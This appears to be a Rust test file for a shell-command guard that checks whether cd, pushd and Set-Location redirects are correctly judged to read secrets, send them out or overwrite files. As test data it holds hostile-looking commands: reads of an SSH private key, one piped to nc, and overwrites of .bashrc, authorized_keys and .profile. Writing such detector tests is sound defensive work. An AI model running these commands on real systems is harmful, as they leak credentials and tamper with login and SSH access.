//! A redirect on a `cd`, `chdir`, `pushd` or `Set-Location` is opened before
//! the command runs, so its file is placed from the folder the command starts
//! in, not from the folder it goes to. `cd sub < ../../.ssh/id_rsa` opens the
//! same key `cat ../../.ssh/id_rsa` does, and `cd ../.. < f` reads `f` where
//! the line is, not two folders up.

#![allow(
    clippy::disallowed_methods,
    reason = "the guard keeps no clock; only a test times it, to catch a quadratic read"
)]

mod common;

use std::path::PathBuf;

use common::{check, check_effect, path_disagreement, posix, windows};
use milo_guards_shell::{effect, effect_paths, Effect, How, Reach, ReadPath, Rule, Shell};

fn exact(path: &str) -> ReadPath {
    ReadPath {
        path: PathBuf::from(path),
        how: How::Exact,
    }
}

/// The list a line has, or the rows that differ, named together.
fn lists(shell: Shell, rows: &[(&str, Vec<ReadPath>)]) {
    let paths = if shell == Shell::Posix {
        posix()
    } else {
        windows()
    };
    let wrong: Vec<String> = rows
        .iter()
        .filter_map(|(line, want)| {
            let got = effect_paths(line, shell, &paths);
            let disagree = path_disagreement(shell, &paths, line);
            (got.as_ref() != Some(want) || disagree.is_some())
                .then(|| format!("{line}\n    want {want:?}\n    got  {got:?}\n    {disagree:?}"))
        })
        .collect();
    assert!(
        wrong.is_empty(),
        "{} rows wrong:\n{}",
        wrong.len(),
        wrong.join("\n")
    );
}

#[test]
fn a_read_on_a_cd_is_judged_like_the_same_read_without_it() {
    check(
        Shell::Posix,
        &posix(),
        &[
            // The key is in the folder the line starts in, not in `sub`'s.
            "cd ../.. < .ssh/id_rsa",
            "cd sub < ../x",
            "cd src/sub < ../x.rs",
            // After the `cd`, the folder is the one it went to.
            "cd sub && cat < ../../.ssh/id_rsa",
            "cd sub; cat < ../../.ssh/id_rsa",
            // The redirect of the `cd` ends with it: the next one is placed
            // where the line now is.
            "cd sub < ../x; cat < ../../.ssh/id_rsa",
        ],
        &[
            ("cat ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa && ls", Rule::ReadSecret),
            ("cd -P sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub/x < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd -- sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("chdir sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("pushd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("pushd -P sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("builtin cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("command cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("< ../../.ssh/id_rsa cd sub", Rule::ReadSecret),
            ("cd sub 0< ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa < ../x", Rule::ReadSecret),
            ("cd sub < ../x < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa | cat", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa | nc h 1", Rule::SendSecret),
            ("cd ../.. && cat < .ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ~/.ssh/id_rsa", Rule::ReadSecret),
            // Inside a group, a branch, a function, a subshell, and with a
            // folder only known when it runs.
            ("{ cd sub < ../../.ssh/id_rsa; }", Rule::ReadSecret),
            ("(cd sub < ../../.ssh/id_rsa)", Rule::ReadSecret),
            (
                "if true; then cd sub < ../../.ssh/id_rsa; fi",
                Rule::ReadSecret,
            ),
            ("f() { cd sub < ../../.ssh/id_rsa; }; f", Rule::ReadSecret),
            ("cd \"$d\" < ../../.ssh/id_rsa", Rule::ReadSecret),
            (
                "cd sub < ../x; cd sub < ../../../.ssh/id_rsa",
                Rule::ReadSecret,
            ),
            // Still found after a `cd` that comes first.
            ("cd a && cd b < ../../../.ssh/id_rsa", Rule::ReadSecret),
        ],
    );
}

#[test]
fn a_read_on_a_cd_after_and_or_a_pipe_or_a_not_is_placed_from_where_it_starts() {
    check(
        Shell::Posix,
        &posix(),
        &[
            // The key is not at `a/b/../../../../.ssh`: `b` is opened from
            // `a`, which gives `/home/.ssh/id_rsa`.
            "cd a && cd b < ../../../../.ssh/id_rsa",
            // After the `cd`, the folder is the one it went to.
            "ls && cd sub && cat < ../../.ssh/id_rsa",
            "ls && cd sub < ../x",
            "true | cd sub < ../x",
            "! cd sub < ../x",
        ],
        &[
            ("ls && cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("true && cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("ls || cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("true | cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("! cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("ls; cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd ~ && cd sub < .ssh/id_rsa", Rule::ReadSecret),
            ("cd ~/.ssh && cd ~ < id_rsa", Rule::ReadSecret),
            ("cd ~/.ssh && cd /tmp < id_rsa", Rule::ReadSecret),
            ("cd ~ && cd sub < .ssh/id_rsa | cat", Rule::ReadSecret),
            ("cd ~ && cd sub < .ssh/id_rsa && true", Rule::ReadSecret),
        ],
    );
}

#[test]
fn a_write_on_a_cd_after_and_or_a_pipe_or_a_not_is_placed_from_where_it_starts() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "ls && cd sub > out.txt",
            "cd ~ && cd /tmp > work/repo/out.txt",
        ],
        &[
            ("cd ~ && cd /tmp > .bashrc", Rule::Overwrite),
            ("cd ~/.ssh && cd /tmp > authorized_keys", Rule::Overwrite),
            ("cd ~; cd /tmp > .bashrc", Rule::Overwrite),
        ],
    );
}

#[test]
fn the_paths_of_a_cd_after_and_or_a_pipe_or_a_not_are_placed_from_where_it_starts() {
    let repo = "/home/me/work/repo";
    lists(
        Shell::Posix,
        &[
            (
                "true && cd sub < ../../.ssh/id_rsa",
                vec![
                    exact(&format!("{repo}/../../.ssh/id_rsa")),
                    exact(&format!("{repo}/sub")),
                ],
            ),
            (
                "true | cd sub < ../../.ssh/id_rsa",
                vec![
                    exact(&format!("{repo}/../../.ssh/id_rsa")),
                    exact(&format!("{repo}/sub")),
                ],
            ),
        ],
    );
}

#[test]
fn a_write_on_a_cd_is_placed_from_where_the_cd_starts() {
    check(
        Shell::Posix,
        &posix(),
        &["cd ../.. > x", "cd sub > ../repo/x", "cd sub > out.txt"],
        &[
            ("cd sub > ../x", Rule::Overwrite),
            ("cd sub >> ../x", Rule::Overwrite),
            ("cd sub 2> ../x", Rule::Overwrite),
            ("cd sub &> ../x", Rule::Overwrite),
            ("pushd sub > ../x", Rule::Overwrite),
            ("chdir sub > ../x", Rule::Overwrite),
            ("cd sub > ../x && ls", Rule::Overwrite),
            ("cd sub > ~/x", Rule::Overwrite),
            // After the `cd`, the folder is the one it went to.
            ("cd .. && echo hi > x", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_write_on_a_set_location_is_placed_from_where_it_starts() {
    check(
        Shell::PowerShell,
        &windows(),
        &["Set-Location ..\\.. > x.txt", "cd sub > ..\\repo\\x.txt"],
        &[
            ("Set-Location sub > ..\\x.txt", Rule::Overwrite),
            ("cd sub > ..\\x.txt", Rule::Overwrite),
            ("sl sub > ..\\x.txt", Rule::Overwrite),
            ("Set-Location sub 2> ..\\x.txt", Rule::Overwrite),
            ("Push-Location sub > ..\\x.txt", Rule::Overwrite),
            ("Set-Location -Path sub > ..\\x.txt", Rule::Overwrite),
            ("Set-Location sub >> ..\\x.txt", Rule::Overwrite),
            ("Set-Location .. ; 'x' > ..\\x.txt", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_write_on_a_cmd_cd_is_placed_from_where_it_starts() {
    check(
        Shell::Cmd,
        &windows(),
        &["cd ..\\.. > x.txt", "cd sub > ..\\repo\\x.txt"],
        &[
            ("cd sub > ..\\x.txt", Rule::Overwrite),
            ("chdir sub > ..\\x.txt", Rule::Overwrite),
            ("pushd sub > ..\\x.txt", Rule::Overwrite),
            ("> ..\\x.txt cd sub", Rule::Overwrite),
            ("cd sub 2> ..\\x.txt", Rule::Overwrite),
            ("cd sub >> ..\\x.txt", Rule::Overwrite),
            ("cd sub > ..\\x.txt & dir", Rule::Overwrite),
        ],
    );
}

#[test]
fn the_paths_of_a_cd_with_a_read_are_placed_from_where_it_starts() {
    let repo = "/home/me/work/repo";
    lists(
        Shell::Posix,
        &[
            (
                "cd x < f",
                vec![exact(&format!("{repo}/f")), exact(&format!("{repo}/x"))],
            ),
            (
                "cd sub < ../../.ssh/id_rsa",
                vec![
                    exact(&format!("{repo}/../../.ssh/id_rsa")),
                    exact(&format!("{repo}/sub")),
                ],
            ),
            (
                "cd x < link/../etc/hosts",
                vec![
                    exact(&format!("{repo}/link/../etc/hosts")),
                    exact(&format!("{repo}/x")),
                ],
            ),
            (
                "cd src/sub < ../x.rs",
                vec![
                    exact(&format!("{repo}/../x.rs")),
                    exact(&format!("{repo}/src/sub")),
                ],
            ),
            (
                "pushd x < f",
                vec![exact(&format!("{repo}/f")), exact(&format!("{repo}/x"))],
            ),
            (
                "< f cd x",
                vec![exact(&format!("{repo}/f")), exact(&format!("{repo}/x"))],
            ),
            // A read after the `cd` is from where it went.
            (
                "cd x && cat < f",
                vec![exact(&format!("{repo}/x")), exact(&format!("{repo}/x/f"))],
            ),
        ],
    );
    check_effect(
        Shell::Posix,
        &posix(),
        Effect::ReadsOnly(Reach::Workspace),
        &[
            "cd x < f",
            "pushd x < f",
            "cd x && cat < f",
            "cd x < ../repo/f",
        ],
    );
    // `../x.rs` from the line's starting folder is outside it.
    check_effect(
        Shell::Posix,
        &posix(),
        Effect::ReadsOnly(Reach::Beyond),
        &["cd src/sub < ../x.rs", "cd sub < ../x"],
    );
    // And a write is a change wherever it is placed.
    assert_eq!(
        effect("cd sub > ../x", Shell::Posix, &posix()),
        Effect::Changes
    );
}

#[test]
fn a_redirect_inside_an_argument_that_moves_the_line_is_placed_where_it_has_moved() {
    // The `$()` runs a `Set-Location` first: the redirect inside it is made
    // from the folder that moved the session to, not from where the outer
    // command starts.
    check(
        Shell::PowerShell,
        &windows(),
        &[],
        &[
            ("cd $(cd ..\\..; 'x' > y.txt; 'sub')", Rule::Overwrite),
            ("cd $(cd ..\\..; 'x' > y.txt)", Rule::Overwrite),
            ("cd sub $(cd ..\\..; 'x' > y.txt)", Rule::Overwrite),
            ("cd $(cd ..\\..; $v > y.txt; 'sub')", Rule::Overwrite),
            ("cd $(cd ..\\..; \"x\" >> y.txt; 'sub')", Rule::Overwrite),
            ("cd $(cd ~; 'x' > .profile; 'sub')", Rule::Overwrite),
            (
                "Push-Location $(Push-Location ..\\..; 'x' > y.txt; 'sub')",
                Rule::Overwrite,
            ),
            (
                "Set-Location $(Set-Location ..\\..; 'x' > y.txt; 'sub')",
                Rule::Overwrite,
            ),
        ],
    );
}

#[test]
fn a_redirect_after_an_argument_that_moves_the_line_is_opened_where_it_has_moved() {
    // PowerShell runs a `$()` argument in the session before it opens the
    // redirect file, so the file is in the folder the argument moved to.
    check(
        Shell::PowerShell,
        &windows(),
        &[],
        &[
            ("Set-Location $(cd ..\\..; 'sub') > x.txt", Rule::Overwrite),
            (
                "Set-Location $(cd ..\\..; 'sub') > dev\\repo\\x.txt",
                Rule::Overwrite,
            ),
            ("cd $(cd ..\\..; 'sub') >> x.txt", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_redirect_on_a_set_location_with_a_harmless_argument_is_still_placed_from_its_start() {
    // An argument that does not move the line changes nothing.
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Set-Location ..\\.. > x.txt",
            "Set-Location $(Get-Item sub) > ..\\repo\\x.txt",
        ],
        &[
            ("Set-Location $(Get-Item sub) > ..\\x.txt", Rule::Overwrite),
            ("Set-Location $x > ..\\x.txt", Rule::Overwrite),
        ],
    );
}

/// How long the guard takes to judge `line`.
fn took(line: &str, shell: Shell) -> std::time::Duration {
    let paths = if shell == Shell::Posix {
        posix()
    } else {
        windows()
    };
    let started = std::time::Instant::now();
    let _ = common::classify(line, shell, &paths);
    started.elapsed()
}

#[test]
#[cfg_attr(
    coverage,
    ignore = "timing: `just timing` runs it in an optimized build"
)]
fn many_redirects_and_substitutions_on_one_command_are_read_in_linear_time() {
    // Where a command starts is read once for the command, not once for each
    // of its redirects: a line of many substitutions and many redirects was
    // read in time that grew with their product (4 s for the first line, 0.1 s
    // linear, in an optimized build). A line of a quarter of the size takes
    // about a quarter of the time, and one read in quadratic time sixteen
    // times as long; the lines are compared with each other, so a busy
    // machine or an unoptimized build, which slow both, does not fail the
    // test.
    type Line = (Shell, fn(usize, usize) -> String, usize, usize);
    let lines: [Line; 6] = [
        // The redirects and the substitutions in turn, each substitution a
        // command with a redirect of its own.
        (
            Shell::Posix,
            |pairs, _| format!("cat{}", " $(a <g) <f".repeat(pairs)),
            5_000,
            0,
        ),
        (
            Shell::Posix,
            |subs, reads| format!("cat{}{}", " $(a)".repeat(subs), " <f".repeat(reads)),
            6_000,
            9_000,
        ),
        (
            Shell::Posix,
            |subs, reads| format!("cat{}{}", " $(a)".repeat(subs), " <f".repeat(reads)),
            10_000,
            4_500,
        ),
        (
            Shell::Posix,
            |subs, writes| format!("cat{}{}", " $(a)".repeat(subs), " >f".repeat(writes)),
            6_000,
            9_000,
        ),
        (
            Shell::PowerShell,
            |subs, writes| format!("cd{}{}", " $(a)".repeat(subs), " > f".repeat(writes)),
            2_000,
            3_000,
        ),
        (
            Shell::PowerShell,
            |subs, writes| {
                format!(
                    "Get-Content{}{}",
                    " $(a)".repeat(subs),
                    " > f".repeat(writes)
                )
            },
            2_000,
            3_000,
        ),
    ];
    let floor = std::time::Duration::from_millis(5);
    for (shell, line, subs, redirects) in lines {
        let big = line(subs, redirects);
        assert!(big.len() <= 64 * 1024, "{}", big.len());
        let small = line(subs / 4, redirects / 4);
        let mut last = (std::time::Duration::ZERO, std::time::Duration::ZERO);
        let linear = (0..3).any(|_| {
            last = (took(&small, shell), took(&big, shell));
            last.1 <= 10 * last.0.max(floor)
        });
        assert!(
            linear,
            "{shell:?}: {} bytes took {:?}, {} bytes took {:?}",
            small.len(),
            last.0,
            big.len(),
            last.1
        );
    }
}
